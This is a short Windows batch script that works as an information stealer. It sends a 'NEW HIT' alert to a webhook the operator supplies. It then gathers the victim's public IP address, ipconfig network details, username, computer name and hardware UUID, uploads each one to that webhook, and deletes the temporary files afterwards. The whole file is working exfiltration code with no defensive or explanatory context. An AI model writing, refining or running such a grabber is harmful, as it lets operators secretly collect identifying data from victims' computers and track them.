@echo off
set webhook=*your webhook here*
curl -X POST -d "content=||@here||||@everyone||" %webhook%
curl -X POST -d "content=NEW HIT!!!!" %webhook%

curl -X POST -d "content=public ip:" %webhook%
curl --silent --output ip.txt http://ipinfo.io/ip
curl --silent --output /dev/null -F l=@"ip.txt" %webhook%
del ip.txt

curl -X POST -d "content=ipconfig:" %webhook%
ipconfig >database.txt
curl --silent --output /dev/null -F l=@"database.txt" %webhook%
del database.txt

curl -X POST -d "content= pc username:" %webhook%
echo %username%>pcusername.txt
curl --silent --output /dev/null -F l=@"pcusername.txt" %webhook%
del pcusername.txt 

curl -X POST -d "content= pc name:" %webhook%
hostname>pcname.txt 
curl --silent --output /dev/null -F l=@"pcname.txt" %webhook%
del pcname.txt 

curl -X POST -d "content= uuid(hwid):" %webhook%
wmic csproduct get uuid>hwid.txt 
curl --silent --output /dev/null -F l=@"hwid.txt" %webhook%

del hwid.txt 
del pcname.txt 
del hwid.txt 
del pcusername.txt 
del cpuid.txt 
del database.txt
del ip.txt